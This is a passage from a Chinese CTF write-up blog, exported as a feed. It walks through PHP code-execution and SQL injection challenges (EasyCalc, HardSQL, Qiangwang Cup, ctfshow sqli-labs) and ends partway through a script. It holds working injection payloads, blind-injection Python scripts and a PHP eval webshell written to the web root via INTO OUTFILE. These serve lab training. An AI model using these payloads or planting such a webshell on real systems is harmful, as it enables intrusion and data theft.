class="hljs-number">46</span>)));<br><br>查看根目录下文件<br>http://node5.buuoj.cn:<span class="hljs-number">26596</span>/calc.php? num=<span class="hljs-built_in">print_r</span>(<span class="hljs-built_in">scandir</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-number">47</span>)));<br></code></pre></td></tr></table></figure><p>注意：这里’.’的ascii码值为46、而’&#x2F;‘的值为47。</p><p>8、发现根目录下有一个f1agg 文件，推测是flag文件，使用文件读取函数读取该文件即可</p><p><img src="/../image/RoarCTF2019-EasyCalc1-3.png"></p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss">我们可以使用<span class="hljs-built_in">file_get_contents</span>()函数读取文件，参数就用<span class="hljs-built_in">chr</span>()函数将文件名的每一个字符拼接即可<br>这里把file_get_contents函数换成highlight_file或者show_source都行<br><br>http://node5.buuoj.cn:<span class="hljs-number">26596</span>/calc.php? num=<span class="hljs-built_in">file_get_contents</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-number">47</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">102</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">49</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">97</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">103</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">103</span>));<br></code></pre></td></tr></table></figure><p>拿到flag。</p><p><img src="/../image/RoarCTF2019-EasyCalc1-4.png"></p><hr><h2 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h2><p>这里可以利用全局变量rce来得到flag，因为这里没有过滤include以及eval函数</p><p>由于代码只对 num 参数的值做了过滤，因此 nss 参数理论上可以造成任意代码执行。</p><p>但是这里过滤的函数太多了，但是include还能用，我们直接包含f1agg文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://node5.buuoj.cn:26596/calc.php? num=1;<span class="hljs-built_in">eval</span>(end(pos(get_defined_vars())))&amp;nss=include(<span class="hljs-string">&quot;/f1agg&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="绕过waf的方式"><a href="#绕过waf的方式" class="headerlink" title="绕过waf的方式"></a>绕过waf的方式</h2><h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><p>第一种就是前面使用的空格绕过，即在传参?后加一个空格</p><h2 id="http-请求走私"><a href="#http-请求走私" class="headerlink" title="http 请求走私"></a>http 请求走私</h2><p>绕过waf的方式还有一种，http请求走私，</p><p><img src="/../image/RoarCTF2019-EasyCalc1-5.png"></p><p>原理就是在请求头中输入两个Content-Length头，使得前端无法识别，直接将整个包完全发给了后端。但这样还是要接受后端的黑名单过滤，所以 num 传参还是不能为所欲为。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 刷题笔记 </tag>
            
            <tag> 命令执行 </tag>
            
            <tag> waf绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战2019-HardSQL1</title>
      <link href="/2025/03/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-HardSQL1/"/>
      <url>/2025/03/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-HardSQL1/</url>
      
        <content type="html"><![CDATA[<h1 id="HardSQL1"><a href="#HardSQL1" class="headerlink" title="HardSQL1"></a>HardSQL1</h1><p>1、首先打开并访问靶机，发现是一个登录界面。</p><p>输入1’1试试，发现有报错。</p><p><img src="/../image/HardSQL1-1.png"></p><p>所以我们可以尝试报错注入。</p><p>2、先不用报错注入先试试一些常规注入，比如万能密码之类的。发现过滤了很多关键字，比如空格、&#x3D;</p><p><img src="/../image/HardSQL1-2.png"></p><p>3、我们尝试报错注入查看库名。</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp"><span class="hljs-number">1</span>&#x27;or(<span class="hljs-name">updatexml</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,database(),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>))#<br></code></pre></td></tr></table></figure><p>得到库名’geek’</p><p><img src="/../image/HardSQL1-3.png"></p><p>4、继续使用报错注入查看表名，这里因为空格被过滤了，所以用()代替空格，而且因为等号&#x3D;被过滤了，所以可以使用like来代替</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp"><span class="hljs-number">1</span>&#x27;or(<span class="hljs-name">updatexml</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(<span class="hljs-name">select</span>(<span class="hljs-name">group_concat</span>(<span class="hljs-name">table_name</span>))from(<span class="hljs-name">information_schema</span>.tables)where(<span class="hljs-name">table_schema</span>)like(<span class="hljs-name">database</span>())),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>))#<br></code></pre></td></tr></table></figure><p>得到表名’H4rDsq1’</p><p><img src="/../image/HardSQL1-4.png"></p><p>5、报错注入查看列名</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp"><span class="hljs-number">1</span>&#x27;or(<span class="hljs-name">updatexml</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(<span class="hljs-name">select</span>(<span class="hljs-name">group_concat</span>(<span class="hljs-name">column_name</span>))from(<span class="hljs-name">information_schema</span>.columns)where(<span class="hljs-name">table_name</span>)like(&#x27;H4rDsq1&#x27;)),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>))#<br></code></pre></td></tr></table></figure><p>查看到列名id，username，password</p><p><img src="/../image/HardSQL1-5.png"></p><p>6、拿到列名后输出表中信息。</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp"><span class="hljs-number">1</span>&#x27;or(<span class="hljs-name">updatexml</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(<span class="hljs-name">select</span>(<span class="hljs-name">group_concat</span>(<span class="hljs-name">username</span>,&#x27;-&#x27;,password))from(<span class="hljs-name">H4rDsq1</span>)),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>))#<br></code></pre></td></tr></table></figure><p>得到flag了，但是发现只有一半flag。</p><p><strong>~flag-flag{747f0adc-5d5e-486e-ae</strong></p><p><img src="/../image/HardSQL1-6.png"></p><hr><p>什么原因呢？这是因为updatexml报错注入最多只能输出32个字符，如果要看到后面的内容其实可以使用substr，但是substr被过滤了，但是还可以使用right()函数从字符串最右边起开始输出字符。</p><p>比如</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">right</span>(<span class="hljs-params"><span class="hljs-string">&#x27;hello,world&#x27;</span>,<span class="hljs-number">5</span></span>)</span>;<br>会输出world<br></code></pre></td></tr></table></figure><p>所以构造语句使用right()突破字符限制</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp"><span class="hljs-number">1</span>&#x27;or(<span class="hljs-name">updatexml</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(<span class="hljs-name">select</span>(<span class="hljs-name">group_concat</span>((<span class="hljs-name">right</span>(<span class="hljs-name">password</span>,<span class="hljs-number">25</span>))))from(<span class="hljs-name">H4rDsq1</span>)),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>))#<br></code></pre></td></tr></table></figure><p>前一段~flag-flag{747f0adc-5d5e-486e-ae</p><p>得到后一段flag值<del>e-486e-ae7a-58a2d1a6c670}</del></p><p>拼接两段flag，拼接的时候注意不要重复拼接相同的部分，所以第二段flag应从7a-58a2d1a6c670}拼接</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">747</span>f0adc-<span class="hljs-number">5</span>d5e-<span class="hljs-number">486</span>e-ae7a-<span class="hljs-number">58</span>a2d1a6c670&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 刷题笔记 </tag>
            
            <tag> sql注入 </tag>
            
            <tag> 报错注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>强网杯2019-随便注1</title>
      <link href="/2025/03/11/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A81/"/>
      <url>/2025/03/11/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A81/</url>
      
        <content type="html"><![CDATA[<h1 id="强网杯2019-随便注1"><a href="#强网杯2019-随便注1" class="headerlink" title="强网杯2019-随便注1"></a>强网杯2019-随便注1</h1><p>1、首先启动并访问靶机，可以看到一个输入框，先测试下<code>1&#39; or 1=1 #</code></p><p>提交后发现成功输出了该表的所有数据，但是没有flag</p><p><img src="/../image/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A81-1.png"></p><p>2、既然可以注入，我们试一下union联合查询，当然需要用order by测试列数，测得2列，所以我们注入</p><p><code>1&#39; union select 1,2 #</code></p><p>3、然后发现系统提示</p><p><code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></p><p>说明select关键字被过滤了，我们可以通过堆叠注入的方式，来绕过select关键字。</p><p>4、查看数据库</p><p><code>1&#39;;show databases;#</code></p><p><img src="/../image/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A81-2.png"></p><p>5、查看表名</p><p><code>1&#39;;show tables;#</code></p><p><img src="/../image/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A81-3.png"></p><p>6、查看一下第一个表”1919810931114514”的表结构，方法有两个</p><p><code>1&#39;; show columns from tableName;#</code></p><p>或者</p><p><code>1&#39;;desc tableName;#</code></p><p>这里注意，如果tableName是纯数字，需要用`反引号包裹。</p><p>查询到flag字段</p><p><img src="/../image/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A81-4.png"></p><p>8、获取flag</p><h2 id="方法1（sql预处理拼接select关键字）"><a href="#方法1（sql预处理拼接select关键字）" class="headerlink" title="方法1（sql预处理拼接select关键字）"></a>方法1（sql预处理拼接select关键字）</h2><p>因为select关键字被过滤了，我们可以通过sql预处理去拼接select关键字：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span>;<span class="hljs-function">prepare st <span class="hljs-keyword">from</span> <span class="hljs-title">concat</span>(<span class="hljs-params"><span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;elect&#x27;</span>,<span class="hljs-string">&#x27; * from `1919810931114514`&#x27;</span></span>)</span>;execute st;<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p><img src="/../image/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A81-5.png"></p><hr><h2 id="方法2（sql预处理十六进制编码）"><a href="#方法2（sql预处理十六进制编码）" class="headerlink" title="方法2（sql预处理十六进制编码）"></a>方法2（sql预处理十六进制编码）</h2><p>依然使用sql预处理语句，但是后面的查询部分可以使用十六进制编码，这样就能绕过select关键字过滤</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">我们将<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-symbol">`1919810931114514`</span> 进行十六进制编码<br><br><span class="hljs-number">73656</span>c656374202a2066726f6d20603139313938313039333131313435313460<br></code></pre></td></tr></table></figure><p><img src="/../image/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A81-6.png"></p><p>payload：</p><p>这里注意前面要加0x即十六进制数标识</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-number">1</span>&#x27;;prepare st from 0x<span class="hljs-number">7365</span>6c<span class="hljs-number">65637420</span>2a<span class="hljs-number">206672</span>6f6d<span class="hljs-number">20603139313938</span><span class="hljs-number">31303933313131</span><span class="hljs-number">3435313460</span>;execute st;#<br>或者<br>定义一个变量并将sql语句初始化，然后调用<br>1&#x27;<span class="hljs-punctuation">;</span>Set @cnm <span class="hljs-punctuation">=</span> <span class="hljs-number">0</span>x73656c656374202a2066726f6d20603139313938313039333131313435313460<span class="hljs-punctuation">;</span>prepare st from @cnm<span class="hljs-punctuation">;</span>execute st<span class="hljs-punctuation">;</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><hr><h2 id="方法3（handler句柄）"><a href="#方法3（handler句柄）" class="headerlink" title="方法3（handler句柄）"></a>方法3（handler句柄）</h2><p><strong>说明：在SQL中，HANDLER 是用于直接访问表的一种方式。HANDLER 语句用于打开表，并为后续操作提供对表的直接访问。</strong></p><p><strong>(1)handler table_name open as hd; 指定数据表进行载入并返回句柄</strong></p><p><strong>(2)handler hd read first; 读取指定表&#x2F;句柄的首航数据</strong></p><p><strong>(3)handler hd read next; 读取指定表&#x2F;句柄的下一行数据</strong></p><p><strong>(4)handler hd close; 关闭句柄</strong></p><p>payload：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-number">1</span>&#x27;;handler `<span class="hljs-number">19198109311145</span>14` open;handler `<span class="hljs-number">19198109311145</span>14` read first;handler `<span class="hljs-number">19198109311145</span>14` close;<br><br>FlagHere<br></code></pre></td></tr></table></figure><hr><h2 id="方法4（利用rename和alter重命名）"><a href="#方法4（利用rename和alter重命名）" class="headerlink" title="方法4（利用rename和alter重命名）"></a>方法4（利用rename和alter重命名）</h2><p>们输入1后，默认会显示id为1的数据，可以猜测默认显示的是words表的数据，查看words表结构第一个字段名为<code>id</code>我们把words表随便改成words1，然后把1919810931114514表改成words，再把列名flag改成id，就可以达到直接输出flag字段的值的效果</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">1</span>&#x27;;alter table <span class="hljs-built_in">words</span> rename <span class="hljs-keyword">to</span> words1;alter table `<span class="hljs-number">1919810931114514</span>` rename <span class="hljs-keyword">to</span> <span class="hljs-built_in">words</span>;alter table <span class="hljs-built_in">words</span> change flag <span class="hljs-built_in">id</span> varchar(<span class="hljs-number">50</span>);<span class="hljs-comment">#</span><br><br>然后通过<br><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">or</span> <span class="hljs-number">1</span> = <span class="hljs-number">1</span> <span class="hljs-comment">#</span><br>成功得到flag<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 刷题笔记 </tag>
            
            <tag> sql注入 </tag>
            
            <tag> 堆叠注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-sqli-labs</title>
      <link href="/2025/03/08/ctfshow-sqli-labs/"/>
      <url>/2025/03/08/ctfshow-sqli-labs/</url>
      
        <content type="html"><![CDATA[<h1 id="ctfshow-sqli-labs"><a href="#ctfshow-sqli-labs" class="headerlink" title="ctfshow-sqli-labs"></a>ctfshow-sqli-labs</h1><h2 id="web-517-字符型注入"><a href="#web-517-字符型注入" class="headerlink" title="web-517 字符型注入"></a>web-517 字符型注入</h2><p>判断闭合类型</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span> and <span class="hljs-number">1</span>=<span class="hljs-number">2</span>--+//成功回显、说明是字符型注入<br><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span>&#x27; and <span class="hljs-number">1</span>=<span class="hljs-number">2</span>--+//无回显，说明闭合成功，是单引号闭合<br></code></pre></td></tr></table></figure><p>payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs routeros">判断列数，测出有3列<br><span class="hljs-attribute">id</span>=1&#x27; order by 3--+<br><br>测试回显位，测得回显位是2,3<br><span class="hljs-attribute">id</span>=-1&#x27; union select 1,2,3--+<br><br>查看库名，得到库名<span class="hljs-string">&#x27;ctfshow&#x27;</span><br><span class="hljs-attribute">id</span>=-1&#x27; union select 1,2,group_concat(schema_name) <span class="hljs-keyword">from</span> information_schema.schemata--+<br><br>查看表名，得到表名<span class="hljs-string">&#x27;flag&#x27;</span><br><span class="hljs-attribute">id</span>=-1&#x27; union select 1,2,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=<span class="hljs-string">&#x27;ctfshow&#x27;</span>--+<br><br>查看列名，得到列名<span class="hljs-string">&#x27;id,flag&#x27;</span><br><span class="hljs-attribute">id</span>=-1&#x27; union select 1,2,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;flag&#x27;</span>--+<br><br>查看数据，得到flag<br><span class="hljs-attribute">id</span>=-1&#x27; union select 1,2,group_concat(id,<span class="hljs-string">&#x27;-&#x27;</span>,flag) <span class="hljs-keyword">from</span> ctfshow.flag--+<br></code></pre></td></tr></table></figure><hr><h2 id="web-518-数字型注入"><a href="#web-518-数字型注入" class="headerlink" title="web-518 数字型注入"></a>web-518 数字型注入</h2><p>判断闭合类型</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span><span class="hljs-comment">--+//无回显</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-comment">--+//有回显</span><br>判断是数字型注入<br></code></pre></td></tr></table></figure><p>payload：</p><p>将上题payload中的单引号闭合去掉即可</p><hr><h2 id="web-519-字符型注入id-1’"><a href="#web-519-字符型注入id-1’" class="headerlink" title="web-519 字符型注入id&#x3D;1’)"></a>web-519 字符型注入id&#x3D;1’)</h2><p>‘)闭合</p><hr><h2 id="web-520-字符型注入id-1”"><a href="#web-520-字符型注入id-1”" class="headerlink" title="web-520 字符型注入id&#x3D;1”)"></a>web-520 字符型注入id&#x3D;1”)</h2><p>“)闭合</p><hr><h2 id="web-521-布尔盲注id-1’"><a href="#web-521-布尔盲注id-1’" class="headerlink" title="web-521 布尔盲注id&#x3D;1’"></a>web-521 布尔盲注id&#x3D;1’</h2><p>判断闭合类型</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-comment">--+//有回显</span><br><span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span><span class="hljs-comment">--+//无回想</span><br>说明是单引号闭合，且只会回显you are <span class="hljs-keyword">in</span>..。<br>所以可以使用布尔盲注<br></code></pre></td></tr></table></figure><p>盲注脚本：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs maxima">import requests<br><br><span class="hljs-keyword">if</span> __name__ == &#x27;__main__&#x27;:<br>    url = &#x27;http://6398c35d-<span class="hljs-number">03b5</span>-43f2-8f62-4a82ae9777d9.challenge.ctf.<span class="hljs-built_in">show</span>/?id=&#x27;<br>    result = &#x27;&#x27;<br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> True:<br>        i = i + <span class="hljs-number">1</span><br>        low = <span class="hljs-number">32</span><br>        high = <span class="hljs-number">127</span><br>        <span class="hljs-keyword">while</span> low &lt; high:<br>            mid = (low + high) // <span class="hljs-number">2</span><br><br>            # payload = f&#x27;<span class="hljs-number">1</span>\&#x27; <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(<span class="hljs-built_in">ascii</span>(substr((select group_concat(schema_name) from information_schema.schemata),&#123;i&#125;,<span class="hljs-number">1</span>))&gt;&#123;mid&#125;,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)--+&#x27;<br>            # payload = f&#x27;<span class="hljs-number">1</span>\&#x27; <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(<span class="hljs-built_in">ascii</span>(substr((select group_concat(table_name) from information_schema.tables where table_schema=<span class="hljs-string">&quot;ctfshow&quot;</span>),&#123;i&#125;,<span class="hljs-number">1</span>))&gt;&#123;mid&#125;,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)--+&#x27;<br>            # payload = f&#x27;<span class="hljs-number">1</span>\&#x27; <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(<span class="hljs-built_in">ascii</span>(substr((select group_concat(column_name) from information_schema.<span class="hljs-built_in">columns</span> where table_name=<span class="hljs-string">&quot;flagpuck&quot;</span>),&#123;i&#125;,<span class="hljs-number">1</span>))&gt;&#123;mid&#125;,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)--+&#x27;<br>            payload = f&#x27;<span class="hljs-number">1</span>\&#x27; <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(<span class="hljs-built_in">ascii</span>(substr((select group_concat(flag33) from ctfshow.flagpuck),&#123;i&#125;,<span class="hljs-number">1</span>))&gt;&#123;mid&#125;,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)--+&#x27;<br><br>            r = requests.<span class="hljs-built_in">get</span>(url=url + payload)<br>            <span class="hljs-keyword">if</span> &#x27;You are <span class="hljs-keyword">in</span>&#x27; <span class="hljs-keyword">in</span> r.text:<br>                low = mid + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                high = mid<br><br>        <span class="hljs-keyword">if</span> low != <span class="hljs-number">32</span>:<br>            result += chr(low)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">break</span><br>        <span class="hljs-built_in">print</span>(result)<br><br></code></pre></td></tr></table></figure><hr><h2 id="web-522-布尔盲注id-1”"><a href="#web-522-布尔盲注id-1”" class="headerlink" title="web-522 布尔盲注id&#x3D;1”"></a>web-522 布尔盲注id&#x3D;1”</h2><p>双引号闭合”，其他和上题一样，使用布尔盲注即可</p><hr><h2 id="web-523-利用SQL中的into-outfile-函数-id-1’"><a href="#web-523-利用SQL中的into-outfile-函数-id-1’" class="headerlink" title="web-523 利用SQL中的into outfile 函数 id&#x3D;1’))"></a>web-523 利用SQL中的into outfile 函数 id&#x3D;1’))</h2><p>首先测试闭合，测试出来是<code>&#39;))</code>闭合，所以这里用布尔盲注也可以，但是这里提示我们使用写入文件的方式拿到flag。</p><p>payload：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-comment">//将表名写入到1.txt文件中，访问文件得到表名flagdk</span><br>?id=<span class="hljs-number">1&#x27;</span>)) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;ctfshow&#x27;</span> <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&quot;/var/www/html/1.txt&quot;</span>--+<br><br><span class="hljs-comment">//将列名写入到2.txt下，访问文件得到列名</span><br>?id=<span class="hljs-number">1&#x27;</span>)) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;flagdk&#x27;</span> <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&quot;/var/www/html/2.txt&quot;</span>--+<br><br><span class="hljs-comment">//将flag写入到3.txt，访问文件得到flag</span><br>?id=<span class="hljs-number">1&#x27;</span>)) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(flag43) <span class="hljs-keyword">from</span> ctfshow.flagdk <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&quot;/var/www/html/3.txt&quot;</span>--+<br><br>这题也可以在写入的文件里插入一句话木马，然后蚁剑连接得到flag<br>?id=<span class="hljs-number">1&#x27;</span>)) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;</span> <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&#x27;D:\\SoftWare\\PHPstudy\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\a.php&#x27;</span> --+<br></code></pre></td></tr></table></figure><hr><h2 id="web-524-布尔盲注"><a href="#web-524-布尔盲注" class="headerlink" title="web-524 布尔盲注"></a>web-524 布尔盲注</h2><p>同上布尔盲注</p><hr><h2 id="web-525-时间盲注id-1’"><a href="#web-525-时间盲注id-1’" class="headerlink" title="web-525 时间盲注id&#x3D;1’"></a>web-525 时间盲注id&#x3D;1’</h2><p>首先测试闭合类型，用了很多种测试发现回显都不变化，尝试一下时间盲注测试</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span>&#x27; and sleep(<span class="hljs-number">3</span>)--+<br></code></pre></td></tr></table></figure><p>发现页面3秒后才响应，所以这题是单引号注入，且能够时间盲注，使用时间盲注脚本</p><p>python脚本</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">import requests<br>import <span class="hljs-built_in">time</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span> :<br>    url = <span class="hljs-string">&#x27;http://e8c67313-e60b-4134-a12c-c84afb13e1b3.challenge.ctf.show/?id=&#x27;</span><br>    <span class="hljs-built_in">result</span> = <span class="hljs-string">&#x27;&#x27;</span><br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> True:<br>        i = i + <span class="hljs-number">1</span><br>        low = <span class="hljs-number">32</span><br>        high = <span class="hljs-number">127</span><br>        <span class="hljs-keyword">while</span> low &lt; high:<br>            <span class="hljs-keyword">mid</span> = (low + high)<span class="hljs-comment"> // 2</span><br>            payload = f<span class="hljs-string">&#x27;1\&#x27; and if(ascii(substr((select group_concat(schema_name) from 